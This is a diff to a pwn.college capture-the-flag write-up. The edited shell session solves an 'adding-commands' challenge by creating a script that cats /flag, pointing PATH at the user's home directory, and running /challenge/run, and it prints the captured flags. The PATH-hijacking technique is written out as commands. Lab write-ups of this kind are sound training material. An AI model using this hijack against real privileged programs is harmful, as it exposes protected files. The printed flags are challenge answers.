@@ -71,13 +71,14 @@ pwn.college{cdjrRzXIv69zlHPsbIJhmXl-uNd.01NzEzNxwSM5kjNzEzW}
 > **Flag:** `pwn.college{A1NIsYzw_RrTWAOoqmctVLKSLTL.QX2cjM1wSM5kjNzEzW}`
 
 ```bash
-hacker@path~adding-commands:~$ echo #!/bin/bash > /tmp/win
-hacker@path~adding-commands:~$ echo /bin/cat /flag >> /tmp/win
-hacker@path~adding-commands:~$ chmod +x /tmp/win
-hacker@path~adding-commands:~$ PATH=/tmp
-hacker@path~adding-commands:~$ /challenge/run
+hacker@path~adding-commands:~$ echo '#!/bin/bash' > win  
+hacker@path~adding-commands:~$ echo '/run/dojo/bin/cat /flag' >> win
+hacker@path~adding-commands:~$ chmod +x win      
+hacker@path~adding-commands:~$ PATH=/home/hacker 
+hacker@path~adding-commands:~$ /challenge/run  
 Invoking 'win'....
 pwn.college{A1NIsYzw_RrTWAOoqmctVLKSLTL.QX2cjM1wSM5kjNzEzW}
+hacker@path~adding-commands:~$ ^C
 
 ```
 
